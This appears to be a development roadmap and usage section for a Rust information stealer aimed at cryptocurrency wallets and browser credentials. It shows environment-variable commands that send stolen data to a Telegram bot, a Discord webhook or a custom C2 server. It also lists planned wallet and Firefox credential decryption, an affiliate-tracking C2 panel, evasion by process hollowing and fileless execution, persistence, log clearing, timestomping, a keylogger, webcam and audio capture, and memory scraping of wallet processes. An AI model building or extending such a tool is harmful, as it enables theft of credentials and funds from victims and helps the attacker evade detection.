## Exfiltration Methods

- [x] Telegram integration (module exists, wired to main.rs)
- [x] Discord integration (module exists, wired to main.rs)
- [ ] DNS tunneling (stub only)

**Usage:**
```bash
# Telegram
export HMM_TRANSPORT_ENDPOINT="telegram://BOT_TOKEN/CHAT_ID"

# Discord  
export HMM_TRANSPORT_ENDPOINT="discord://https://discord.com/api/webhooks/ID/TOKEN"

# HTTPS (custom C2)
export HMM_TRANSPORT_ENDPOINT="https://your-c2-server.com/upload"
export HMM_TRANSPORT_API_KEY="your-api-key"
```

    Wallet Decryption
     - [ ] MetaMask vault decryption (needs DPAPI + user password)
     - [ ] Exodus wallet decryption
     - [ ] Electrum wallet decryption
     - [ ] Firefox key4.db + logins.json decryption

    Backend/C2
     - [ ] C2 server (not implemented - you must build/host your own)
     - [ ] Log panel/dashboard
     - [ ] Affiliate tracking system

    Evasion Enhancements
     - [ ] String obfuscation/encryption
     - [ ] Code packing
     - [ ] Process injection (hollowing, reflective DLL)
     - [ ] Fileless execution
     - [ ] API hashing

    Persistence
     - [ ] Registry Run keys
     - [ ] Scheduled tasks
     - [ ] Startup folder
     - [ ] Service installation

    Cleanup
     - [ ] Self-destruction
     - [ ] Log clearing (Windows Event Logs)
     - [ ] Timestomping

    Other Modules (not wallet-related)
     - [ ] Screenshot (stub)
     - [ ] Keylogger (stub)
     - [ ] Clipboard monitor (stub)
     - [ ] Webcam capture (stub)
     - [ ] Audio recording (stub)

    ---

 Remaining for Memory Extraction

    To add memory scraping, you'd need:

     1 Memory Extraction Module:
     2   - [ ] Process enumeration (find MetaMask/Chrome/Electron processes)
     3   - [ ] Memory dumping (ReadProcessMemory / procfs)
     4   - [ ] Pattern scanning (search for key formats)
     5   - [ ] String extraction + entropy filtering
     6   - [ ] Key validation (checksum verification)
